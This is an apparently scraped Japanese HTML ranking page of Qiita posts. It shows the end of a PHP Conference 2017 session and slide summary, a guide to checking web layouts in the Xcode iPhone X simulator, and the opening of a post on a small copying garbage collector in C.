資料：<a href="https://speakerdeck.com/yaizuuuu/mobairupeziwobao-su-ni-laraveldeshi-xian-suruampdui-ying-falsezi-dong-hua-number-phpcon2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/yaizuuuu/mobairupeziwobao-su-ni-laraveldeshi-xian-suruampdui-ying-falsezi-dong-hua-number-phpcon2017</a></p>

<h2>
<span id="session35-chatworkとphpと私" class="fragment"></span><a href="#session35-chatwork%E3%81%A8php%E3%81%A8%E7%A7%81"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/tanakayuki/chatworktophptosi" rel="nofollow noopener" target="_blank">session35: ChatWorkとPHPと私</a>
</h2>

<p>スピーカー：ChatWork株式会社 田中佑樹<br>
資料：<a href="https://speakerdeck.com/tanakayuki/chatworktophptosi" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/tanakayuki/chatworktophptosi</a></p>

<h2>
<span id="session36-phpアプリケーションにおけるdockerコンテナクラスター戦略" class="fragment"></span><a href="#session36-php%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8Bdocker%E3%82%B3%E3%83%B3%E3%83%86%E3%83%8A%E3%82%AF%E3%83%A9%E3%82%B9%E3%82%BF%E3%83%BC%E6%88%A6%E7%95%A5"><i class="fa fa-link"></i></a>session36: PHPアプリケーションにおけるDockerコンテナ・クラスター戦略</h2>

<p>スピーカー：<a href="/_nishigori" class="user-mention js-hovercard" title="_nishigori" data-hovercard-target-type="user" data-hovercard-target-name="_nishigori">@_nishigori</a><br>
資料：<a href="https://github.com/nishigori/phpcon2017-presentation" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/nishigori/phpcon2017-presentation</a></p>

<h2>
<span id="session37-phpで理解するニューラルネットワークを使った機械学習" class="fragment"></span><a href="#session37-php%E3%81%A7%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B%E3%83%8B%E3%83%A5%E3%83%BC%E3%83%A9%E3%83%AB%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%9F%E6%A9%9F%E6%A2%B0%E5%AD%A6%E7%BF%92"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/niisantokyo/phpdeniyurarunetutowozuo-tutahua" rel="nofollow noopener" target="_blank">session37: PHPで理解するニューラルネットワークを使った機械学習</a>
</h2>

<p>スピーカー：新倉 涼太<br>
資料：<a href="https://speakerdeck.com/niisantokyo/phpdeniyurarunetutowozuo-tutahua" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/niisantokyo/phpdeniyurarunetutowozuo-tutahua</a></p>

<h2>
<span id="session38-phpで作るサービスのこれまでの10年とこれからの10年" class="fragment"></span><a href="#session38-php%E3%81%A7%E4%BD%9C%E3%82%8B%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AE%E3%81%93%E3%82%8C%E3%81%BE%E3%81%A7%E3%81%AE10%E5%B9%B4%E3%81%A8%E3%81%93%E3%82%8C%E3%81%8B%E3%82%89%E3%81%AE10%E5%B9%B4"><i class="fa fa-link"></i></a>session38: PHPで作るサービスの、これまでの10年とこれからの10年</h2>

<p>スピーカー：弁護士ドットコム CTO 市橋 立<br>
資料：</p>

<h1>
<span id="ライトニングトーク" class="fragment"></span><a href="#%E3%83%A9%E3%82%A4%E3%83%88%E3%83%8B%E3%83%B3%E3%82%B0%E3%83%88%E3%83%BC%E3%82%AF"><i class="fa fa-link"></i></a>ライトニングトーク</h1>

<h2>
<span id="lt01-mdd筋肉駆動開発" class="fragment"></span><a href="#lt01-mdd%E7%AD%8B%E8%82%89%E9%A7%86%E5%8B%95%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/MasahikoJinno2/phpcon2017-lt01-mdd" rel="nofollow noopener" target="_blank">LT01 MDD（筋肉駆動開発）</a>
</h2>

<p>スピーカー：<a href="/MiracleTShirt09" class="user-mention js-hovercard" title="MiracleTShirt09" data-hovercard-target-type="user" data-hovercard-target-name="MiracleTShirt09">@MiracleTShirt09</a><br>
資料：<a href="https://www.slideshare.net/MasahikoJinno2/phpcon2017-lt01-mdd" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/MasahikoJinno2/phpcon2017-lt01-mdd</a></p>

<h2>
<span id="lt02-初めてphpを触った話" class="fragment"></span><a href="#lt02-%E5%88%9D%E3%82%81%E3%81%A6php%E3%82%92%E8%A7%A6%E3%81%A3%E3%81%9F%E8%A9%B1"><i class="fa fa-link"></i></a>LT02 初めてPHPを触った話</h2>

<p>スピーカー：えるもあ<br>
資料：</p>

<h2>
<span id="lt03-phpでjavascriptを書く話" class="fragment"></span><a href="#lt03-php%E3%81%A7javascript%E3%82%92%E6%9B%B8%E3%81%8F%E8%A9%B1"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/kinzal/phpjavascript-phpconf2017/1" rel="nofollow noopener" target="_blank">LT03 PHPでJavaScriptを書く話</a>
</h2>

<p>スピーカー：kinzal<br>
資料：<a href="https://www.slideshare.net/kinzal/phpjavascript-phpconf2017/1" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/kinzal/phpjavascript-phpconf2017/1</a></p>

<h2>
<span id="lt04-結果にコミットするiotデバイスを作ってみたら本当に痩せた話" class="fragment"></span><a href="#lt04-%E7%B5%90%E6%9E%9C%E3%81%AB%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%99%E3%82%8Biot%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%82%92%E4%BD%9C%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%9F%E3%82%89%E6%9C%AC%E5%BD%93%E3%81%AB%E7%97%A9%E3%81%9B%E3%81%9F%E8%A9%B1"><i class="fa fa-link"></i></a>LT04 結果にコミットするIoTデバイスを作ってみたら本当に痩せた話</h2>

<p>スピーカー：山田寛延<br>
その他資料：<a href="http://tech.innovator.jp.net/entry/commit2016" class="autolink" rel="nofollow noopener" target="_blank">http://tech.innovator.jp.net/entry/commit2016</a></p>

<h2>
<span id="lt05-いかにして若手phperはレガシーなwebサービスと向き合うようになったか" class="fragment"></span><a href="#lt05-%E3%81%84%E3%81%8B%E3%81%AB%E3%81%97%E3%81%A6%E8%8B%A5%E6%89%8Bphper%E3%81%AF%E3%83%AC%E3%82%AC%E3%82%B7%E3%83%BC%E3%81%AAweb%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%A8%E5%90%91%E3%81%8D%E5%90%88%E3%81%86%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F%E3%81%8B"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/purple_jwl/php-conference-2017" rel="nofollow noopener" target="_blank">LT05 いかにして若手PHPerはレガシーなWebサービスと向き合うようになったか</a>
</h2>

<p>スピーカー：ぱーぽー <a href="/purple_jwl" class="user-mention js-hovercard" title="purple_jwl" data-hovercard-target-type="user" data-hovercard-target-name="purple_jwl">@purple_jwl</a><br>
資料：<a href="https://speakerdeck.com/purple_jwl/php-conference-2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/purple_jwl/php-conference-2017</a></p>

<h2>
<span id="lt06-3年目エンジニアossをはじめる" class="fragment"></span><a href="#lt06-3%E5%B9%B4%E7%9B%AE%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2oss%E3%82%92%E3%81%AF%E3%81%98%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/bmf_san/3nian-mu-enziniaosswohazimeru" rel="nofollow noopener" target="_blank">LT06 3年目エンジニアOSSをはじめる</a>
</h2>

<p>スピーカー：<a href="/bmf_san" class="user-mention js-hovercard" title="bmf_san" data-hovercard-target-type="user" data-hovercard-target-name="bmf_san">@bmf_san</a><br>
資料：<a href="https://speakerdeck.com/bmf_san/3nian-mu-enziniaosswohazimeru" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/bmf_san/3nian-mu-enziniaosswohazimeru</a><br>
これ作ってるそうです：<a href="https://github.com/bmf-san/Rubel" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/bmf-san/Rubel</a></p>

<h2>
<span id="lt07-phpカンファレンス福岡を3年連続開催して思うこと" class="fragment"></span><a href="#lt07-php%E3%82%AB%E3%83%B3%E3%83%95%E3%82%A1%E3%83%AC%E3%83%B3%E3%82%B9%E7%A6%8F%E5%B2%A1%E3%82%923%E5%B9%B4%E9%80%A3%E7%B6%9A%E9%96%8B%E5%82%AC%E3%81%97%E3%81%A6%E6%80%9D%E3%81%86%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>LT07 PHPカンファレンス福岡を3年連続開催して思うこと</h2>

<p>スピーカー：赤瀬 剛<br>
資料：<br>
※来年も開催するそうです！(その場のくじで決まった)</p>

<h2>
<span id="lt08-swaggerでphpとunityエンジニアが仲良くなった話" class="fragment"></span><a href="#lt08-swagger%E3%81%A7php%E3%81%A8unity%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%81%8C%E4%BB%B2%E8%89%AF%E3%81%8F%E3%81%AA%E3%81%A3%E3%81%9F%E8%A9%B1"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/sgeengineer/phpconference-lt-swaggerdephptounityenziniagazhong-liang-kunatutahua" rel="nofollow noopener" target="_blank">LT08 SwaggerでPHPとUnityエンジニアが仲良くなった話</a>
</h2>

<p>スピーカー：仙道 航・株式会社グリフォン<br>
資料：<a href="https://speakerdeck.com/sgeengineer/phpconference-lt-swaggerdephptounityenziniagazhong-liang-kunatutahua" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/sgeengineer/phpconference-lt-swaggerdephptounityenziniagazhong-liang-kunatutahua</a><br>
その他資料：<a href="https://tech.griphone.co.jp/2017/10/08/swagger/" class="autolink" rel="nofollow noopener" target="_blank">https://tech.griphone.co.jp/2017/10/08/swagger/</a></p>

<h2>
<span id="lt09-良いテストデータ悪いテストデータ" class="fragment"></span><a href="#lt09-%E8%89%AF%E3%81%84%E3%83%86%E3%82%B9%E3%83%88%E3%83%87%E3%83%BC%E3%82%BF%E6%82%AA%E3%81%84%E3%83%86%E3%82%B9%E3%83%88%E3%83%87%E3%83%BC%E3%82%BF"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/fortkle/testdata-antipattern" rel="nofollow noopener" target="_blank">LT09 良いテストデータ、悪いテストデータ</a>
</h2>

<p>スピーカー：FUKUAKI TAKANO<br>
資料：<a href="https://speakerdeck.com/fortkle/testdata-antipattern" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/fortkle/testdata-antipattern</a></p>

<h2>
<span id="lt10-phpでgoogle-cloud-spannerをつかってみる" class="fragment"></span><a href="#lt10-php%E3%81%A7google-cloud-spanner%E3%82%92%E3%81%A4%E3%81%8B%E3%81%A3%E3%81%A6%E3%81%BF%E3%82%8B"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/sgeengineer/phpconference-lt-phpdegooglecloudspannerwotukatutemiru" rel="nofollow noopener" target="_blank">LT10 PHPでGoogle Cloud Spannerをつかってみる</a>
</h2>

<p>スピーカー：Suguru Shirai<br>
資料：<a href="https://speakerdeck.com/sgeengineer/phpconference-lt-phpdegooglecloudspannerwotukatutemiru" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/sgeengineer/phpconference-lt-phpdegooglecloudspannerwotukatutemiru</a></p>

<h2>
<span id="lt11-告白に学ぶhttpステータスコード" class="fragment"></span><a href="#lt11-%E5%91%8A%E7%99%BD%E3%81%AB%E5%AD%A6%E3%81%B6http%E3%82%B9%E3%83%86%E3%83%BC%E3%82%BF%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>LT11 告白に学ぶHTTPステータスコード</h2>

<p>スピーカー：高橋　慎一<br>
資料：</p>

<h2>
<span id="lt12-php拡張をpeclに登録してわかったこと" class="fragment"></span><a href="#lt12-php%E6%8B%A1%E5%BC%B5%E3%82%92pecl%E3%81%AB%E7%99%BB%E9%8C%B2%E3%81%97%E3%81%A6%E3%82%8F%E3%81%8B%E3%81%A3%E3%81%9F%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/hnw/phppecl" rel="nofollow noopener" target="_blank">LT12 PHP拡張をPECLに登録してわかったこと</a>
</h2>

<p>スピーカー：KLab株式会社 hnw<br>
資料：<a href="https://www.slideshare.net/hnw/phppecl" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/hnw/phppecl</a></p>

<h1>
<span id="講演予定だった内容" class="fragment"></span><a href="#%E8%AC%9B%E6%BC%94%E4%BA%88%E5%AE%9A%E3%81%A0%E3%81%A3%E3%81%9F%E5%86%85%E5%AE%B9"><i class="fa fa-link"></i></a>講演予定だった内容</h1>

<h2>
<span id="今からでもできるwebサービスモニタリング" class="fragment"></span><a href="#%E4%BB%8A%E3%81%8B%E3%82%89%E3%81%A7%E3%82%82%E3%81%A7%E3%81%8D%E3%82%8Bweb%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%83%A2%E3%83%8B%E3%82%BF%E3%83%AA%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/soudai/web-service-monitoring" rel="nofollow noopener" target="_blank">今からでもできる！Webサービスモニタリング！！</a>
</h2>

<p>資料：<a href="https://speakerdeck.com/soudai/web-service-monitoring" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/soudai/web-service-monitoring</a><br>
その他資料：<a href="http://soudai.hatenablog.com/entry/web-service-monitoring" class="autolink" rel="nofollow noopener" target="_blank">http://soudai.hatenablog.com/entry/web-service-monitoring</a></p>

<h1>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h1>

<ul>
<li><a href="https://career.levtech.jp/guide/knowhow/article/267/" rel="nofollow noopener" target="_blank">【速報】PHP Conference 2017の資料まとめ［随時更新］#phpcon2017</a></li>
<li><a href="http://qiita.com/hikarut/items/68d102489a5e936467bb" id="reference-b0c9658d1af19458a494">PHPカンファレンス2016まとめ</a></li>
</ul>

<h1>
<span id="感想" class="fragment"></span><a href="#%E6%84%9F%E6%83%B3"><i class="fa fa-link"></i></a>感想</h1>

<p>今年も面白かったです！オープニングセッションでPHP7を使っている人が会場だと半数以上いて、去年からかなり進化しているなぁというのを実感しました。また今回はLTのテーマもあらかじめタイムスケジュールとして共有されていたりと運営側の準備がとても良かったかなと思いました！その辺りも年々進化している感じが良いですね。資料まとめ(<a href="https://career.levtech.jp/guide/knowhow/article/267/" rel="nofollow noopener" target="_blank">【速報】PHP Conference 2017の資料まとめ［随時更新］#phpcon2017</a>)も早い段階で作られていたので、このまとめ自体いらなかったなぁと思うくらいでした。(自分も前日くらいから準備していたのでせっかくなので公開しましたけど。。)<br>
また来年も参加します！</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">73位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>139</kbd>
		<a target="_blank" href="https://qiita.com/tonkotsuboy_com/items/c54dbc5e3e0e2243a703">iPhone Xを購入せず、無料でウェブページの表示確認を行う方法 (macOS)</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-20<br />09:41:31</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/67884.html">tonkotsuboy_com</a>(109件の記事)<br />(ICS INC. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/67884/profile-images/1508766707">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[HTML]</b> <b>[iPhone]</b> <b>[Mac]</b> <b>[HTML5]</b> <b>[Xcode]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>今年10月に発売が予定されている<a href="https://www.apple.com/jp/iphone-x/" rel="nofollow noopener" target="_blank">iPhone X</a>は、その独特なディスプレイの為にセーフエリアを意識したウェブデザインが必須です。iPhone Xで意図せぬ表示にならないように実機の購入が必要だと考えるかもしれませんが、<strong>実はmacOSユーザーであれば、iPhone Xを購入せず無料でウェブページの表示確認を行えます</strong>。このエントリーでは、iPhone Xでの表示確認方法について紹介します。</p>

<p><a href="https://camo.qiitausercontent.com/6cd93e626fb0b644e8fb9cc15f70f0f93018b2d2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f36633636333665612d386466322d633137352d376166312d3631303939336265333632632e706e67" target="_blank" rel="nofollow noopener"><img width="433" alt="" src="https://camo.qiitausercontent.com/6cd93e626fb0b644e8fb9cc15f70f0f93018b2d2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f36633636333665612d386466322d633137352d376166312d3631303939336265333632632e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/67884/6c6636ea-8df2-c175-7af1-610993be362c.png"></a></p>

<p>▲ iPhone Xでの表示確認をしている様子</p>

<h1>
<span id="iphone-xで起こりうる意図せぬ表示" class="fragment"></span><a href="#iphone-x%E3%81%A7%E8%B5%B7%E3%81%93%E3%82%8A%E3%81%86%E3%82%8B%E6%84%8F%E5%9B%B3%E3%81%9B%E3%81%AC%E8%A1%A8%E7%A4%BA"><i class="fa fa-link"></i></a>iPhone Xで起こりうる意図せぬ表示</h1>

<p>例えば、画面最下部にコピーライトを固定表示しているサイトをよく見かけますが、iPhone XのSafariではメニューバーを表示する為のボタンで隠れる可能性があります。また、横持ちにしたときにコンテンツの左右が途切れてしまう可能性もあります。</p>

<p><a href="https://camo.qiitausercontent.com/263963133608f70b1e5967e202666ba78ff4ba85/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f36356439306364662d623163662d386363652d353264342d6461396464666530333965632e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/263963133608f70b1e5967e202666ba78ff4ba85/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f36356439306364662d623163662d386363652d353264342d6461396464666530333965632e6a706567" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/67884/65d90cdf-b1cf-8cce-52d4-da9ddfe039ec.jpeg"></a></p>

<p>▲ 「<a href="https://developer.apple.com/ios/human-interface-guidelines/overview/whats-new/" rel="nofollow noopener" target="_blank">iOS Human Interface Guidelines</a>」より</p>

<p>これらの表示を予め把握して対策するには、Xcodeに付属するSimulatorを用います。</p>

<h1>
<span id="iphone-xsimulatorでの表示確認方法" class="fragment"></span><a href="#iphone-xsimulator%E3%81%A7%E3%81%AE%E8%A1%A8%E7%A4%BA%E7%A2%BA%E8%AA%8D%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>iPhone X(Simulator)での表示確認方法</h1>

<p>① Xcodeの最新バージョン9を<a href="https://itunes.apple.com/jp/app/xcode/id497799835?mt=12" rel="nofollow noopener" target="_blank">App Storeよりインストール</a>します。</p>

<p>② インストールが完了したら、一度Xcodeを起動し、画面にしたがって利用規約の同意やコンポーネントのインストールを行います（全てYesでOK）。完了したらXcodeは閉じて構いません。</p>

<p>③ [アプリケーション]フォルダのXcodeのアイコン上で右クリックし、[パッケージの内容を表示]をクリックします。</p>

<p><a href="https://camo.qiitausercontent.com/dd11960540e8e93a830c18baab4d7a0a5552d3d5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f65633034626566362d376130392d633739312d636361302d3533303037353536393032652e706e67" target="_blank" rel="nofollow noopener"><img width="405" src="https://camo.qiitausercontent.com/dd11960540e8e93a830c18baab4d7a0a5552d3d5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f65633034626566362d376130392d633739312d636361302d3533303037353536393032652e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/67884/ec04bef6-7a09-c791-cca0-53007556902e.png"></a></p>

<p>④ Xcode.appの中身が表示されるので、[Contents]→[Developer]→[Applications]より、[Simulator]をクリックします。</p>

<p><a href="https://camo.qiitausercontent.com/e10bd43875c67991c153c17a722e742fb3f5aa5f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f34333365626664622d623434642d306663332d326433382d3962646232316330643233352e706e67" target="_blank" rel="nofollow noopener"><img width="370" alt="" src="https://camo.qiitausercontent.com/e10bd43875c67991c153c17a722e742fb3f5aa5f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f34333365626664622d623434642d306663332d326433382d3962646232316330643233352e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/67884/433ebfdb-b44d-0fc3-2d38-9bdb21c0d235.png"></a></p>

<p>⑤ iOSのデバッグ確認を行うSimulatorが起動します。Xcode 9では初期状態でiPhone Xが起動します。</p>

<p>⑥ Safariを起動し、確認したいウェブサイトのURLを入力すれば、iPhone Xでの表示確認ができます。</p>

<p><a href="https://camo.qiitausercontent.com/6cd93e626fb0b644e8fb9cc15f70f0f93018b2d2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f36633636333665612d386466322d633137352d376166312d3631303939336265333632632e706e67" target="_blank" rel="nofollow noopener"><img width="433" alt="" src="https://camo.qiitausercontent.com/6cd93e626fb0b644e8fb9cc15f70f0f93018b2d2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f36633636333665612d386466322d633137352d376166312d3631303939336265333632632e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/67884/6c6636ea-8df2-c175-7af1-610993be362c.png"></a></p>

<h1>
<span id="デバッグが便利になるテクニック" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%8C%E4%BE%BF%E5%88%A9%E3%81%AB%E3%81%AA%E3%82%8B%E3%83%86%E3%82%AF%E3%83%8B%E3%83%83%E3%82%AF"><i class="fa fa-link"></i></a>デバッグが便利になるテクニック</h1>

<h2>
<span id="横持ちでの表示確認" class="fragment"></span><a href="#%E6%A8%AA%E6%8C%81%E3%81%A1%E3%81%A7%E3%81%AE%E8%A1%A8%E7%A4%BA%E7%A2%BA%E8%AA%8D"><i class="fa fa-link"></i></a>横持ちでの表示確認</h2>

<p>[コマンド]キー+[→]キーを押すとディスプレイが横向きに回転するので、iPhone Xを横持ちにした時の表示確認ができます。</p>

<p><strong>多くのサイトでは、横持ちにした際にコンテンツの左右が途切れていることがわかるでしょう</strong>。</p>

<p><a href="https://camo.qiitausercontent.com/aafd820859b4061c34b5ac9f02980bf964f4fe1d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f63316638366161652d356266312d623866352d666565342d6332353462343939616664662e706e67" target="_blank" rel="nofollow noopener"><img width="852" alt="" src="https://camo.qiitausercontent.com/aafd820859b4061c34b5ac9f02980bf964f4fe1d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f63316638366161652d356266312d623866352d666565342d6332353462343939616664662e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/67884/c1f86aae-5bf1-b8f5-fee4-c254b499afdf.png"></a></p>

<p>この左右の余白の原因や解消方法については、記事「<a href="http://stephenradford.me/removing-the-white-bars-in-safari-on-iphone-x/" rel="nofollow noopener" target="_blank">Removing the White Bars in Safari on iPhone X</a>」にて解説されています。</p>

<h2>
<span id="ホーム画面へ戻る" class="fragment"></span><a href="#%E3%83%9B%E3%83%BC%E3%83%A0%E7%94%BB%E9%9D%A2%E3%81%B8%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a>ホーム画面へ戻る</h2>

<p>[command]+[shift]+[H]をクリックするか、画面下からスワイプします。</p>

<h2>
<span id="デバイスを変更する" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>デバイスを変更する</h2>

<p>iPhone X以外の端末での表示確認を行うには、[Hardware]→[Device]より別の端末を選択します。</p>

<p><a href="https://camo.qiitausercontent.com/94c3bfd3b376b517677ab823991d94a8cc87db72/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f63323233313439362d336562382d373662302d343338372d3339613361613033663433642e706e67" target="_blank" rel="nofollow noopener"><img width="913" alt="" src="https://camo.qiitausercontent.com/94c3bfd3b376b517677ab823991d94a8cc87db72/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36373838342f63323233313439362d336562382d373662302d343338372d3339613361613033663433642e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/67884/c2231496-3eb8-76b0-4387-39a3aa03f43d.png"></a></p>

<h1>
<span id="iphone-xがリリースされる前にウェブサイトの対策を" class="fragment"></span><a href="#iphone-x%E3%81%8C%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9%E3%81%95%E3%82%8C%E3%82%8B%E5%89%8D%E3%81%AB%E3%82%A6%E3%82%A7%E3%83%96%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AE%E5%AF%BE%E7%AD%96%E3%82%92"><i class="fa fa-link"></i></a>iPhone Xがリリースされる前にウェブサイトの対策を</h1>

<p>iPhone Xが独特なディスプレイを持っているとは言え、その挙動を把握しておけば恐れることはありません。Simulatorを使えば100%ではありませんが高い精度でiPhone Xの振る舞いを確認できます。iPhone Xがリリースされる前に、担当しているウェブサイトの表示に不具合がないかを確認するのがよいでしょう。</p>

<p>※ 本エントリーをInternet Watchにて紹介していただきました。<br>
「<a href="http://internet.watch.impress.co.jp/docs/yajiuma/1082456.html" rel="nofollow noopener" target="_blank">【やじうまWatch】 表示エリアが独特なiPhone X、実機を購入せずにウェブページの表示確認を行う方法 - INTERNET Watch</a>」</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">74位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>135</kbd>
		<a target="_blank" href="https://qiita.com/wasabiz/items/bc80581ba24eaaf0ece1">C言語でインクルードするだけで使えるNon-movingで正確なコピーGCを作った</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-09<br />17:46:40</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/11779.html">wasabiz</a>(1件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/11779/profile-images/1473682152">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[C]</b> <b>[GC]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="c言語でインクルードするだけで使えるnon-movingで正確なコピーgcを作った" class="fragment"></span><a href="#c%E8%A8%80%E8%AA%9E%E3%81%A7%E3%82%A4%E3%83%B3%E3%82%AF%E3%83%AB%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B%E3%81%A0%E3%81%91%E3%81%A7%E4%BD%BF%E3%81%88%E3%82%8Bnon-moving%E3%81%A7%E6%AD%A3%E7%A2%BA%E3%81%AA%E3%82%B3%E3%83%94%E3%83%BCgc%E3%82%92%E4%BD%9C%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>C言語でインクルードするだけで使えるNon-movingで正確なコピーGCを作った</h1>

<p>インクルードするだけで使えるNon-movingで正確なGCをC言語用に作りました。<br>
行数がコメントを除いて100行に満たない非常に小さなライブラリです。<br>
GCのアルゴリズムとしてはCheneyのコピーGCを採用しています。<br>
通常のCheneyのコピーGCではメモリ空間のうち半分が無駄になってしまいメモリ効率が悪かったり、<br>
GC発生時にオブジェクトが移動してしまいC言語のようなポインタを直接触れる言語との相性が悪いという欠点がありました。<br>
今回はヒープ全体を二重連結リストとして管理することでそのような問題を解決しています。<br>
ちなみにこれはTreadmill GCのアイデアと同じです。(が、アルゴリズム自体はTreadmill GCではありません。)<br>
APIはLinuxのlist.hに非常に近い見た目になっています。<br>
ある構造体をgcで管理したい場合はstruct gc_head型のメンバを追加するだけで大丈夫です。<br>
他にはヒープに対するアプリオリな知識を仮定していないという特徴があります。<br>
結果として(実際にそれが必要になることはほとんどないと思いますが)このGCを動作させるだけであればlibcも必要ありません。</p>

<h1>
<span id="使い方" class="fragment"></span><a href="#%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>使い方</h1>

<h2>
